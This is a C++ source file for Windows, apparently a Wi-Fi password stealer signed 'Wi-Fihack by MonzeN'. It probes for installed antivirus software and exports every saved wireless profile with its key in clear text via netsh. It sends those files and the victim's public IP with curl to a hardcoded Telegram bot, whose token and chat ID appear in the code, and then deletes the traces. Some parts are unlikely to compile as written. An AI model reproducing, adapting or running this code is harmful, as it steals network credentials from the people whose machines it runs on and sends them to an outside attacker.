#include <iostream>
#include <fstream>
#include <windows.h>
using namespace std;
setlocale(LC_CTYPE, "rus"); 

void start(string name) {
    string cwd = _getcwd(NULL, 0);
    string wlan10 = cwd + "/.bat/wlan10.bat";
    string wlan7 = cwd + "/.bat/wlan7.bat";
    string wlanXP = cwd + "/.bat/wlanXP.bat";
    string filepath;
    if (name == "10") {
        filepath = wlan10;
    } else if (name == "7") {
        filepath = wlan7;
    } else if (name == "XP") {
        filepath = wlanXP;
    } else {
        cout << "Error: invalid system name" << endl;
        return;
    }
    string user = getenv("USERNAME");
    string command = "runas /user:" + user + " \"" + filepath +"\"";
    system(command.c_str());
}

int main() {
    string TOKEN = "5311713070:AAE2bzgCgeybLBaeO2pu9Muol5haf1g6YMY";
    string CHAT_ID = "1434743208";
    string url = "https://api.telegram.org/bot" + TOKEN + "/sendDocument?chat_id=" + CHAT_ID;
    string Antiviruses[] = {
        "C:\\\\Program Files\\\\Windows Defender",
        "C:\\\\Program Files\\\\AVAST Software\\\\Avast",
        "C:\\\\Program Files\\\\AVG\\\\Antivirus",
        "C:\\\\Program Files (x86)\\\\Avira\\\\Launcher",
        "C:\\\\Program Files (x86)\\\\IObit\\\\Advanced SystemCare",
        "C:\\\\Program Files\\\\Bitdefender Antivirus Free",
        "C:\\\\Program Files\\\\DrWeb",
        "C:\\\\Program Files\\\\ESET\\\\ESET Security",
        "C:\\\\Program Files (x86)\\\\Kaspersky Lab",
        "C:\\\\Program Files (x86)\\\\360\\\\Total Security",
        "C:\\\\Program Files\\\\ESET\\\\ESET NOD32 Antivirus"
    };
    string Antivirus;
    for (string path : Antiviruses) {
        if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
            Antivirus = path;
            break;
        }
    }
    try {
        start(to_string(GetVersion()));
    } catch (const exception& e) {
        cout << "Error: " << e.what() << endl;
    }
    system("netsh wlan export profile key=clear");
    string ip;
    try {
        HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        HINTERNET hFile = InternetOpenUrl(hInternet, "http://myip.dnsomatic.com", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        char buffer[4096];
        DWORD bytesRead;
        while(InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
            ip.append(buffer, bytesRead);
        }
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
    } catch (const exception& e) {
        cout << "Error: " << e.what() << endl;
    }
    ofstream getip("get_ip");
    getip << ip << endl;
    getip.close();
    WIN32_FIND_DATAA fileData;
    HANDLE hFind;
    hFind = FindFirstFileA("*.xml", &fileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            try {
                string file = fileData.cFileName;
                string filepath = file;
                ifstream openFile(filepath.c_str(), ios::binary);
                string content((istreambuf_iterator<char>(openFile)), (istreambuf_iterator<char>()));
                string post = "curl -v -i -F document=@\""+ filepath + "\" " + url;
                system(post.c_str());
            } catch (const exception& e) {
                cout << "Error: " << e.what() << endl;
            }
        } while (FindNextFileA(hFind, &fileData) != 0);
        FindClose(hFind);
    }
    try {
        ifstream openFile("get_ip", ios::binary);
        string content((istreambuf_iterator<char>(openFile)), (istreambuf_iterator<char>()));
        string post = "curl -v -i -F document=@\"get_ip\" " + url;
        system(post.c_str());
    } catch (const exception& e) {
        cout << "Error: " << e.what() << endl;
    }
    try {
        string post = "curl -s -X POST https://api.telegram.org/bot" + TOKEN + "/sendMessage -d chat_id=" + CHAT_ID + " -d \"parse_mode=html\" -d text='Wi-Fihack by MonzeN'";
        system(post.c_str());
    } catch (const exception& e) {
        cout << "Error: " << e.what() << endl;
    }
    hFind = FindFirstFileA("*.xml", &fileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            try {
                string file = fileData.cFileName;
                string filepath = file;
                remove(filepath.c_str());
            } catch (const exception& e) {
                cout << "Error: " << e.what() << endl;
            }
        } while (FindNextFileA(hFind, &fileData) != 0);
        FindClose(hFind);
    }
    remove("get_ip");
    return 0;
}